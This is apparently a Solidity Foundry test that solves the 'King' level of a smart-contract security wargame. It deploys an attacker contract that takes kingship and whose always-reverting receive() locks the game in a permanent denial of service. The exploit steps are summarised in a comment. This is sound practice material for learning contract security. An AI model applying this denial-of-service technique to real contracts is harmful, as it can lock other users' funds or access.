// SPDX-License-Identifier: Unlicense
pragma solidity 0.8.28;

import "forge-std/console.sol";
import {Tests} from "@/02_security/core/Tests.sol";
import {King, KingFactory} from "@/02_security/09_king/KingFactory.sol";
import {KingAttack} from "@/02_security/09_king/KingAttack.sol";

contract KingTest is Tests {
    King private level;
    KingAttack private attacker;

    /* =============================== SETUP & ATTACK =============================== */

    constructor() {
        levelFactory = new KingFactory();
    }

    function setupLevel() internal override {
        levelAddress = payable(this.createLevelInstance{value: 1000 wei}());
        level = King(levelAddress);
    }

    /**
     * Exploit summary:
     *
     * 1. Deploy the `KingAttack` contract with 1001 wei, making it capable of claiming kingship.
     *    This is more than the current prize (1000 wei), so it meets the requirement.
     *
     * 2. Call `attack()` from the attacker contract, which sends its entire balance
     *    to the King contract. This makes the attacker contract the new king.
     *
     * 3. The attacker contract includes a `receive()` function that always reverts.
     *    This means when someone else tries to become king, the King contract's
     *    `.transfer()` to the current king (our attacker) will fail and revert the transaction.
     *
     * 4. As a result, no other address can successfully become king, causing a
     *    Denial of Service (DoS) — the kingship is permanently locked to the attacker.
     */
    function attack() internal override {
        vm.startPrank(PLAYER);
        attacker = new KingAttack{value: 1001 wei}();

        console.log("Current king:", level._king());

        // The attacker sends 1001 wei (more than the current prize) to become the new king
        attacker.attack(address(level));

        console.log("Attacker address:", address(attacker));
        console.log("New king:", level._king());

        if (address(attacker) == level._king()) {
            console.log("Successful attack!");
        }

        vm.stopPrank();
    }

    /* =============================== TEST LEVEL =============================== */

    function testLevel() external {
        runLevel();
    }
}
